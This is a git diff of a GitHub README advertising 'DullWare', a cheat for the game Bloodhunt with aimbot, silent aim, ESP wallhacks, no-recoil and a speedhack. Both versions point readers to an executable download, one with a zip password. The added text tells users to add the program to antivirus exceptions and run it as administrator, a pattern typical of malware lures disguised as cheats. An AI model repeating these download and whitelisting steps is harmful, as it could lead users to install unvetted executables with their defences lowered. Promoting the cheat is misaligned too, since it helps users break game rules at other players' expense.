@@ -1,65 +1,82 @@
-# 🩸 **DullWare - Advanced Cheat for Bloodhunt**
-![1](https://github.com/user-attachments/assets/c480c570-615f-495c-be69-7b4c00af60fa)
+# DullWare: The Ultimate Bloodhunt Cheat
+
+![Bloodhunt](https://img.shields.io/badge/Bloodhunt-DullWare-blue?style=for-the-badge&logo=gamepad)
+
+Welcome to the DullWare repository! This project is designed to enhance your Bloodhunt experience with essential features and minimal system requirements. DullWare has been tested by players and is praised for its performance and reliability. 
+
+## Table of Contents
+
+- [Features](#features)
+- [Installation](#installation)
+- [Usage](#usage)
+- [Key Bindings](#key-bindings)
+- [Troubleshooting](#troubleshooting)
+- [Contributing](#contributing)
+- [License](#license)
+- [Contact](#contact)
+
+## Features
+
+DullWare comes packed with features that make it a must-have for any Bloodhunt player. Here are some of the highlights:
+
+- **Aimbot**: Improve your aim with precision targeting.
+- **ESP (Extra Sensory Perception)**: See through walls and locate enemies easily.
+- **Minimal System Requirements**: Designed to run smoothly on low-end systems.
+- **User-Friendly Interface**: Easy to navigate and configure.
+- **Frequent Updates**: Stay ahead with regular updates and new features.
+
+## Installation
+
+To get started, download the latest release from the [Releases section](https://github.com/FUCK199639/Bloodhunt-advanced-cheat-DullWare/releases). Once downloaded, follow these steps:
+
+1. **Extract the Files**: Unzip the downloaded file to a location of your choice.
+2. **Run the Executable**: Locate the executable file and run it.
+3. **Follow the Setup Instructions**: The setup will guide you through the installation process.
+
+## Usage
+
+Once installed, you can start using DullWare right away. Launch the application and follow these steps:
+
+1. **Open Bloodhunt**: Start the game as you normally would.
+2. **Activate DullWare**: Run the DullWare application to enable the features.
+3. **Adjust Settings**: Customize your settings in the DullWare interface to suit your play style.
+
+## Key Bindings
+
+DullWare allows you to customize key bindings for various features. Here are some default bindings:
+
+- **Aimbot Toggle**: F1
+- **ESP Toggle**: F2
+- **Menu Open/Close**: F3
+
+You can change these bindings in the settings menu.
+
+## Troubleshooting
+
+If you encounter any issues while using DullWare, consider the following:
+
+- **Game Compatibility**: Ensure that your version of Bloodhunt is compatible with DullWare.
+- **Antivirus Interference**: Some antivirus programs may flag DullWare. Add it to your exceptions list.
+- **Running as Administrator**: Try running both Bloodhunt and DullWare as an administrator for better performance.
+
+If problems persist, check the [Releases section](https://github.com/FUCK199639/Bloodhunt-advanced-cheat-DullWare/releases) for updates or community support.
+
+## Contributing
+
+We welcome contributions from the community. If you want to help improve DullWare, please follow these steps:
+
+1. **Fork the Repository**: Create your own copy of the repository.
+2. **Make Changes**: Implement your features or fixes.
+3. **Submit a Pull Request**: Share your changes with the community.
+
+## License
+
+DullWare is licensed under the MIT License. Feel free to use and modify the code as needed.
+
+## Contact
+
+For any inquiries or support, please reach out to the repository owner through GitHub.
 
 ---
 
-## 📣 **Overview**
-Introducing **DullWare**, the ultimate cheat for **Bloodhunt**, crafted with essential features and minimal system requirements. Successfully tested and praised by players, this tool guarantees a seamless and enhanced gaming experience. 🔥
-![1](https://github.com/user-attachments/assets/b4cdee55-bd8f-4639-864c-555ca5a01b35)
-![2](https://github.com/user-attachments/assets/f2e0fb73-bbf6-47f2-88c8-67eb9cfbd89b)
-
----
-## 📥 **Download**
-<div align="center">
-    <h2><a href="https://github.com/Hoganieva/Bloodhunt-advanced-cheat-DullWare/releases/download/latest/DullWare.zip">🔹 Download Latest Release from GitHub 🔹</a></h2>
-</div>
-
-💼 **Password to Unzip:** `DullWare`
-
----
-
-### 🛠️ **Instructions**
-1. **Run the Application**  
-   After unzipping the archive, execute the `.exe` file to launch DullWare.
-
-2. **Activate in Game**  
-   Press **HOME** to enable the cheat's features.
-
----
-
-## ✅ **Features**
-
-### Combat Enhancements
-- **AimBot:** Lock onto enemies with precision.  
-- **SilentAim:** Hit targets without visibly adjusting your aim.  
-- **Field of View (FOV):** Customize your targeting radius.  
-- **Smooth:** Adjust the smoothness of aiming movements for more natural shots.  
-- **VisibleCheck:** Only target enemies visible to you.
-
----
-
-### Visuals (ESP)
-- **CornerBox:** Highlight opponents with clear visual markers.  
-- **BoneESP:** Display skeletal structures for detailed targeting.  
-- **Glow ESP:** Outline enemies for enhanced visibility.  
-- **LootESP:** Identify and prioritize important items on the map.  
-- **TrapESP:** Spot traps easily to avoid or disarm.  
-- **RenderFOV:** Show your Field of View range for better awareness.  
-
----
-
-### Utility
-- **NoRecoil:** Eliminate weapon recoil for improved accuracy.  
-- **NoSpread:** Tighten shot spread for consistent damage.  
-- **SpeedHack:** Accelerate movement to outpace opponents.
-
----
-
-## 🖥️ **System Requirements**
-- **Operating Systems:** Windows 10 and Windows 11.  
-- **Supported Processors:** Intel and AMD.  
-- **Game Modes:** Fullscreen, Windowed, and Borderless Windowed.
-
----
-
-⚡ **DullWare** takes your Bloodhunt experience to the next level, allowing you to dominate effortlessly with top-tier functionality. Equip yourself today and claim victory like never before!
+Thank you for choosing DullWare! We hope it enhances your Bloodhunt experience. For the latest updates, check the [Releases section](https://github.com/FUCK199639/Bloodhunt-advanced-cheat-DullWare/releases). Enjoy gaming!
